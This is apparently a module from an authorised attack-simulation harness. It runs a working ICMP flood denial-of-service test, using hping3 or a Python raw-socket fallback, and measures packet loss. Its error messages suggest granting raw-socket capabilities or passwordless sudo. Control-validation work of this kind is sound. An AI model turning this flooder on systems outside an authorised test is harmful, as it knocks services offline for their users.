"""ICMP Flood (DoS). Tests rate-limit / DoS protection.

Engine: hping3 `-1 --flood` is the PRIMARY flooder (raw sockets, line-rate — the
right tool). If hping3 isn't installed, a pure-Python fallback floods ICMP echo
from a background thread (unprivileged via SOCK_DGRAM where the kernel allows it,
else a raw socket as root). Either way a 15-count ping samples packet loss.

Why not Python-only? A Python loop can't match hping3's raw-socket flood rate, so
hping3 stays primary; the fallback just means the module still runs without it.

DoS is a weak control to probe from a single host over the internet — one box
rarely saturates a remote/cloud target, so "no loss" usually means "couldn't
generate enough load", NOT "the control held". Read it that way, and only run
inside an authorised maintenance window.
"""
import os
import re
import shutil
import socket
import struct
import subprocess
import threading
import time

FLOOD_SECONDS = 12   # matches the manual script's `timeout 12 hping3`
PING_COUNT = 15
LOSS_THRESHOLD = 30  # % packet loss considered a real DoS impact

META = {
    "id": "icmp_flood",
    "name": "ICMP Flood (DoS)",
    "category": "Network Exploitation",
    "test_type": "dos",
    "control": "Rate-limit / DoS protection",
    "fix": "SD-WAN",
    "mitre": ['T1498.001'],
    "cwe": ['CWE-400'],
    "tactic": 'Impact',
    # hping3 is PREFERRED but no longer hard-required: without it the Python
    # fallback runs, so it isn't listed in requires (which would make preflight
    # skip the whole module as PREREQ-MISSING). ping is the one true dependency.
    "requires": ["ping"],
    "needs_root": True,   # a real ICMP flood needs raw sockets (root / CAP_NET_RAW)
    "serial": True,       # DoS: must run alone (don't overlap other tests)
    "os_supported": ["Linux"],   # uses `ping -c` + hping3/raw ICMP (Linux-only)
    "ports": [("icmp", None)],   # ICMP, not a TCP/UDP port
    # attack 'worked' = meaningful packet loss during the flood
    "success_regex": r"PASS",
    # deliberately does NOT match FLOOD-PRIV-ERROR — a privilege failure means
    # the flood never ran at all, which must NOT read as "control held".
    "blocked_regex": r"^INFO|INCONCLUSIVE",
}

# markers that mean the flood never actually sent (privilege/tooling failure) —
# NOT evidence the control worked.
_PRIV_ERR_MARKERS = ("operation not permitted", "raw socket", "permission denied",
                     "a password is required", "a terminal is required", "sudo:")


# --------------------------------------------------------------------------
# Pure-Python ICMP flood fallback (used only when hping3 is absent)
# --------------------------------------------------------------------------
def _checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


def _echo_packet(seq):
    pid = os.getpid() & 0xFFFF
    payload = b"mygovnet-bas-icmp"
    header = struct.pack("!BBHHH", 8, 0, 0, pid, seq & 0xFFFF)  # type 8 = echo
    chk = _checksum(header + payload)
    header = struct.pack("!BBHHH", 8, 0, chk, pid, seq & 0xFFFF)
    return header + payload


def _open_icmp_socket():
    """(sock, mode) — try unprivileged SOCK_DGRAM ICMP first (works where
    net.ipv4.ping_group_range allows it), then a raw socket (needs root)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_ICMP)
        return s, "dgram(unprivileged)"
    except (PermissionError, OSError):
        pass
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)  # may raise
    return s, "raw(root)"


def _py_icmp_flood(target, seconds, result):
    """Flood ICMP echo to target for `seconds`; records sent count / error in
    the `result` dict. Runs in a background thread."""
    try:
        sock, mode = _open_icmp_socket()
    except (PermissionError, OSError) as e:
        result["error"] = f"{e.__class__.__name__}: {e}"
        return
    result["mode"] = mode
    sock.setblocking(False)
    deadline = time.time() + seconds
    seq = sent = 0
    try:
        dest = (target, 0)
        while time.time() < deadline:
            try:
                sock.sendto(_echo_packet(seq), dest)
                sent += 1
                seq += 1
            except BlockingIOError:
                continue
            except OSError as e:
                result["error"] = f"{e.__class__.__name__}: {e}"
                break
    finally:
        sock.close()
    result["sent"] = sent


def run(target, ctx):
    out = [f"# ICMP flood DoS vs {target}  ({FLOOD_SECONDS}s flood, "
           f"{PING_COUNT}-count loss sample)"]

    use_hping = shutil.which("hping3") is not None
    flood = None
    py_result = {}
    py_thread = None

    if use_hping:
        out.append("engine: hping3 -1 --flood")
        import core
        # cap with `timeout` if present; elevate hping3 (not `timeout`) via sudo -n.
        prefix = (["timeout", str(FLOOD_SECONDS)] if shutil.which("timeout") else [])
        flood_cmd = prefix + core.sudo_prefix() + ["hping3", "-1", "--flood", target]
        try:
            flood = subprocess.Popen(
                flood_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        except FileNotFoundError:
            use_hping = False  # race: vanished between which() and Popen -> fall back
    if not use_hping:
        out.append("engine: python ICMP fallback (hping3 not installed)")
        py_thread = threading.Thread(
            target=_py_icmp_flood, args=(target, FLOOD_SECONDS, py_result), daemon=True)
        py_thread.start()

    # Sample packet loss with a normal ping while the flood runs.
    try:
        ping = subprocess.run(
            ["ping", "-c", str(PING_COUNT), target],
            capture_output=True, text=True, timeout=PING_COUNT + 10)
        out.append(ping.stdout)
    finally:
        if flood is not None:
            try:
                flood_out, _ = flood.communicate(timeout=FLOOD_SECONDS + 5)
            except Exception:
                flood.kill()
                flood_out, _ = flood.communicate()
        else:
            flood_out = ""
            if py_thread is not None:
                py_thread.join(FLOOD_SECONDS + 5)

    # ----- did the flood actually run? (privilege/tooling failures) -----------
    if use_hping and flood_out and any(m in flood_out.lower() for m in _PRIV_ERR_MARKERS):
        out.append(f"hping3 output: {flood_out.strip()}")
        out.append(
            "FLOOD-PRIV-ERROR: hping3 could not run with the privileges it needs "
            "— the flood never ran. This is NOT evidence the control works. Fix "
            "any ONE of: (a) grant the capability once: sudo setcap "
            "cap_net_raw,cap_net_admin+eip $(which hping3); (b) add a NOPASSWD "
            "sudoers rule for hping3 (the module runs it via `sudo -n hping3`); "
            "or (c) run the harness as root.")
        return "\n".join(out)
    if not use_hping:
        if py_result.get("error"):
            out.append(f"python flood error: {py_result['error']}")
            out.append(
                "FLOOD-PRIV-ERROR: the Python ICMP fallback could not send — "
                "unprivileged ICMP is disabled and we're not root. Fix any ONE of: "
                "(a) install hping3 (sudo apt install hping3) which self-elevates; "
                "(b) run the harness as root; or (c) allow unprivileged ICMP: "
                "sudo sysctl -w net.ipv4.ping_group_range='0 2147483647'.")
            return "\n".join(out)
        out.append(f"python flood: sent {py_result.get('sent', 0)} ICMP echoes "
                   f"via {py_result.get('mode', '?')}")

    # modern iputils prints a fractional percentage (e.g. "73.3333%"), not just
    # "73%" — \d+ alone would silently grab only the digits after the decimal.
    m = re.search(r"(\d+(?:\.\d+)?)% packet loss", ping.stdout)
    loss = float(m.group(1)) if m else None

    if loss is None:
        out.append("INCONCLUSIVE: could not parse packet loss from ping output")
    elif loss > LOSS_THRESHOLD:
        out.append(f"PASS: DoS effective - {loss:.1f}% loss")
    else:
        out.append(f"INFO: {loss:.1f}% loss (below {LOSS_THRESHOLD}% threshold). Note: a "
                   "single host rarely saturates a remote/cloud target, so this usually "
                   "means 'not enough load generated', NOT 'the control held'.")
    return "\n".join(out)
